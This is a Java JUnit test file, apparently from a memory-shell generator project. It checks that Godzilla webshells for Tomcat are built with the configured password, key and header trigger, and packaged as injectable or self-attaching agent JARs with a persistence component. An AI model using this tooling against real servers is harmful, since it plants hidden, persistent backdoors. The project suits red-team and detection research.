package com.reajason.javaweb.examples.memshell;

import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.Server;
import com.reajason.javaweb.agent.AgentInjectorSupport;
import com.reajason.javaweb.agent.AgentPersistence;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.PackerRegistry;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.utils.ClassDefiner;
import com.reajason.javaweb.utils.ClassUtils;
import com.reajason.javaweb.utils.DigestUtils;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.Manifest;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 生成期契约：三重配置怎么落到 shell 字段、动态参数怎么绑定、Agent Jar 长什么样。
 * 真实容器上的注入与连接验证见 integration-test（如 Tomcat8ContainerTest 的
 * AGENT_FILTER_CHAIN 用例），这里只锁生成产物，保持快速、无外部依赖。
 *
 * @author ReaJason
 */
class MemShellGenerationTest {

    private static final String PASS = "pass";
    private static final String KEY = "key";
    private static final String HEADER_VALUE = "Mozilla/5.0";

    @Test
    void godzillaFilterWritesConfiguredFields() throws Exception {
        MemShellResult result = generate(ShellType.FILTER, godzillaConfig());

        assertResult(result);
        // 生成器补齐的默认值
        assertEquals("/*", result.getInjectorConfig().getUrlPattern());
        assertEquals(Opcodes.V1_6, result.getShellConfig().getTargetJreVersion());

        Class<?> shellClass = ClassDefiner.defineClass(result.getShellBytes());
        Object shell = shellClass.getDeclaredConstructor().newInstance();
        String md5Key = DigestUtils.md5Hex(KEY).substring(0, 16);
        assertEquals(PASS, ClassUtils.getFieldValue(shell, "pass"));
        assertEquals(md5Key, ClassUtils.getFieldValue(shell, "key"));
        // 协议里的 md5 = md5(pass + md5(key)[0:16]) 大写：客户端靠它校验回包
        assertEquals(DigestUtils.md5Hex(PASS + md5Key).toUpperCase(),
                ClassUtils.getFieldValue(shell, "md5"));
        assertEquals("User-Agent", ClassUtils.getFieldValue(shell, "headerName"));
        assertEquals(HEADER_VALUE, ClassUtils.getFieldValue(shell, "headerValue"));
    }

    @Test
    void dynamicParamsBindToToolConfig() {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("pass", PASS);
        params.put("key", KEY);
        params.put("headerName", "X-Token");
        params.put("headerValue", HEADER_VALUE);
        params.put("shellClassName", "com.example.memshell.DemoGodzilla");

        MemShellResult result = new MemShellGenerator().generate(
                filterShellConfig(ShellType.SERVLET), InjectorConfig.builder().build(), params);

        assertResult(result);
        assertEquals("com.example.memshell.DemoGodzilla", result.getShellClassName());
        GodzillaConfig config = (GodzillaConfig) result.getShellToolConfig();
        assertEquals(PASS, config.getPass());
        assertEquals(KEY, config.getKey());
        assertEquals("X-Token", config.getHeaderName());
        assertEquals(HEADER_VALUE, config.getHeaderValue());
    }

    @Test
    void blankDynamicParamsKeepBuilderDefaults() {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("pass", "");
        params.put("headerValue", " ");

        MemShellResult result = new MemShellGenerator().generate(
                filterShellConfig(ShellType.SERVLET), InjectorConfig.builder().build(), params);

        GodzillaConfig config = (GodzillaConfig) result.getShellToolConfig();
        assertFalse(config.getPass().isEmpty(), "留空应保留随机默认值");
        assertFalse(config.getHeaderValue().isEmpty(), "留空应保留随机默认值");
    }

    @Test
    void unknownDynamicParamIsRejected() {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("typo", "x");

        GenerationException exception = assertThrows(GenerationException.class, () ->
                new MemShellGenerator().generate(
                        filterShellConfig(ShellType.FILTER), InjectorConfig.builder().build(), params));
        assertTrue(exception.getMessage().contains("Unsupported param for tool Godzilla: typo"));
        assertTrue(exception.getMessage().contains("pass"), "错误信息应列出可用参数");
    }

    @Test
    void unsupportedCombinationIsRejected() {
        ShellConfig shellConfig = filterShellConfig("NoSuchType");
        GenerationException exception = assertThrows(GenerationException.class,
                () -> new MemShellGenerator().generate(
                        shellConfig, InjectorConfig.builder().build(), godzillaConfig()));
        assertTrue(exception.getMessage().contains("unsupported shell type"));
    }

    @Test
    void capabilityCatalogAnswersByAxis() {
        MemShellGenerator.ShellTypeCatalog catalog = new MemShellGenerator().getShellTypeCatalog();

        assertTrue(catalog.getServers().contains(Server.Tomcat));
        assertTrue(catalog.getServersSupporting(ShellTool.Godzilla).contains(Server.Tomcat));
        assertTrue(catalog.getShellTools(Server.Tomcat).contains(ShellTool.Godzilla));
        assertTrue(catalog.getShellTypes(Server.Tomcat, ShellTool.Godzilla).contains(ShellType.FILTER));
        assertTrue(catalog.getShellTypes(Server.Tomcat, ShellTool.Godzilla)
                .contains(ShellType.AGENT_FILTER_CHAIN));

        // 未知组合统一返回空表而不是 null
        assertTrue(catalog.getShellTypes("NoSuchServer", ShellTool.Godzilla).isEmpty());
        assertTrue(catalog.getShellTypes(Server.Tomcat, "NoSuchTool").isEmpty());
        assertTrue(catalog.getServersSupporting(null).isEmpty());
    }

    @Test
    void agentFilterChainPackagesPureAgentJar() throws IOException {
        MemShellResult result = generate(ShellType.AGENT_FILTER_CHAIN, godzillaConfig());
        assertResult(result);

        byte[] jarBytes = decodePack(Packers.AgentJar, result);
        JarContent jar = readJar(jarBytes);

        assertEquals(result.getInjectorClassName(),
                jar.manifest.getMainAttributes().getValue("Agent-Class"));
        assertEquals(result.getInjectorClassName(),
                jar.manifest.getMainAttributes().getValue("Premain-Class"));
        assertEquals("true", jar.manifest.getMainAttributes().getValue("Can-Redefine-Classes"));
        assertEquals("true", jar.manifest.getMainAttributes().getValue("Can-Retransform-Classes"));
        // 纯 Agent Jar 由外部 attach 工具加载，自己没有入口
        assertNull(jar.manifest.getMainAttributes().getValue("Main-Class"));

        assertTrue(jar.entries.contains(classEntry(result.getInjectorClassName())));
        assertTrue(jar.entries.contains(classEntry(result.getShellClassName())));
        assertTrue(jar.entries.contains(classEntry(AgentInjectorSupport.class.getName())));
        assertTrue(jar.entries.contains(classEntry(AgentInjectorSupport.Config.class.getName())));
        String persistenceEntry = classEntry(AgentPersistence.class.getName());
        assertTrue(jar.entries.contains(persistenceEntry));
        assertTrue(jar.entries.contains(classEntry(AgentPersistence.Transformer.class.getName())));
        String persistenceBytecode = new String(readJarEntry(jarBytes, persistenceEntry), StandardCharsets.ISO_8859_1);
        assertTrue(persistenceBytecode.contains("shade/org/objectweb/asm/ClassReader"));
        assertTrue(jar.entries.stream().anyMatch(entry -> entry.startsWith("shade/org/objectweb/asm/")
                && entry.endsWith(".class")), "ASM 应被重定位进 agent jar");
        assertFalse(jar.entries.contains("org/objectweb/asm/ClassReader.class"),
                "重定位后不应残留原包名");
    }

    @Test
    void agentFilterChainPackagesSelfAttachingJar() throws IOException {
        MemShellResult result = generate(ShellType.AGENT_FILTER_CHAIN, godzillaConfig());
        byte[] jarBytes = decodePack(Packers.AgentJarWithJREAttacher, result);
        JarContent jar = readJar(jarBytes);

        String packageName = result.getInjectorClassName()
                .substring(0, result.getInjectorClassName().lastIndexOf('.'));
        assertEquals(result.getInjectorClassName(),
                jar.manifest.getMainAttributes().getValue("Agent-Class"));
        assertEquals(packageName + ".Attacher",
                jar.manifest.getMainAttributes().getValue("Main-Class"));
        assertTrue(jar.entries.contains(packageName.replace('.', '/') + "/Attacher.class"));
        // JRE Attacher 自带 JNA 实现，目标机不需要 tools.jar / jdk.attach
        assertTrue(jar.entries.contains("com/sun/jna/Platform.class"));
    }

    private static MemShellResult generate(String shellType, GodzillaConfig config) {
        return new MemShellGenerator().generate(
                filterShellConfig(shellType), InjectorConfig.builder().build(), config);
    }

    private static ShellConfig filterShellConfig(String shellType) {
        return ShellConfig.builder()
                .server(Server.Tomcat)
                .shellTool(ShellTool.Godzilla)
                .shellType(shellType)
                .build();
    }

    private static GodzillaConfig godzillaConfig() {
        return GodzillaConfig.builder()
                .pass(PASS)
                .key(KEY)
                .headerName("User-Agent")
                .headerValue(HEADER_VALUE)
                .build();
    }

    private static byte[] decodePack(String packer, MemShellResult result) {
        return Base64.getDecoder().decode(PackerRegistry.getInstance().pack(packer, result));
    }

    private static void assertResult(MemShellResult result) {
        assertNotNull(result);
        assertFalse(result.getShellClassName().isEmpty(), "shellClassName");
        assertTrue(result.getShellBytes().length > 0, "shellBytes empty");
        assertEquals(result.getShellBytes().length, result.getShellSize());
        assertArrayEquals(result.getShellBytes(),
                Base64.getDecoder().decode(result.getShellBytesBase64Str()));
        assertFalse(result.getInjectorClassName().isEmpty(), "injectorClassName");
        assertTrue(result.getInjectorBytes().length > 0, "injectorBytes empty");
        assertEquals(result.getInjectorBytes().length, result.getInjectorSize());
        assertArrayEquals(result.getInjectorBytes(),
                Base64.getDecoder().decode(result.getInjectorBytesBase64Str()));
    }

    private static String classEntry(String className) {
        return className.replace('.', '/') + ".class";
    }

    private static byte[] readJarEntry(byte[] bytes, String entryName) throws IOException {
        try (JarInputStream in = new JarInputStream(new ByteArrayInputStream(bytes))) {
            JarEntry entry;
            while ((entry = in.getNextJarEntry()) != null) {
                if (entryName.equals(entry.getName())) {
                    java.io.ByteArrayOutputStream output = new java.io.ByteArrayOutputStream();
                    byte[] buffer = new byte[4096];
                    int length;
                    while ((length = in.read(buffer)) != -1) {
                        output.write(buffer, 0, length);
                    }
                    return output.toByteArray();
                }
            }
        }
        throw new IOException("Missing jar entry: " + entryName);
    }

    private static JarContent readJar(byte[] bytes) throws IOException {
        try (JarInputStream in = new JarInputStream(new ByteArrayInputStream(bytes))) {
            Manifest manifest = in.getManifest();
            assertNotNull(manifest, "jar 必须带 MANIFEST.MF");
            Set<String> entries = new LinkedHashSet<>();
            JarEntry entry;
            while ((entry = in.getNextJarEntry()) != null) {
                entries.add(entry.getName());
            }
            return new JarContent(manifest, entries);
        }
    }

    private static final class JarContent {
        private final Manifest manifest;
        private final Set<String> entries;

        private JarContent(Manifest manifest, Set<String> entries) {
            this.manifest = manifest;
            this.entries = entries;
        }
    }
}
